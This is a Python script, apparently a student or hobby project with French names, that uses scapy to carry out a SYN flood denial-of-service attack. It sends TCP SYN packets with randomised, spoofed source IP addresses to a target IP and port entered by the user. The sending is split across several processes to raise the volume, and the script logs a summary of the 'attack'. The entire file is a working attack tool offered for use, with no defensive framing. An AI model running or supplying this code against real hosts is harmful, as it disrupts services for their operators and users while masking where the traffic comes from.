from barre_de_progression import barre
from scapy.all import *
import multiprocessing
from demande_user import DemandeUtilisateur
import os
from journaltest import Journal


def envois(cible, port, nbrpaquet, ip_sources, journal):
    messages = []
    for _ in range(nbrpaquet):
        ip_source = str(RandIP())
        ip_sources.append(ip_source)
        message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
        print(message)  # Affichage dans la console
        ip = IP(dst=cible, src=ip_source)
        tcpsyn = TCP(dport=port, flags="S")
        send(ip/tcpsyn, verbose=False)
        messages.append(message)  # Ajouter le message à la liste
    return messages

def syn(cible, port, nbrpaquet, nbr_processus):
    packets_per_process = nbrpaquet // nbr_processus
    ip_sources = []
    journal = Journal() 
    messages = envois(cible, port, packets_per_process, ip_sources, journal)  # Appel de la fonction avec les bons arguments
    for _ in range(nbr_processus):
        p = multiprocessing.Process(target=envois, args=(cible, port, packets_per_process, ip_sources, journal))
        p.start()

    barre(nbrpaquet)
    
    premier_message = messages[0]  # Choisissez le premier message
    
    journal.log_demande(cible, port, nbrpaquet, nbr_processus)  
    journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)

if __name__ == "__main__":
    demande_utilisateur = DemandeUtilisateur()
    cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()
    syn(cible, port, nbrpaquet, nbr_processus)
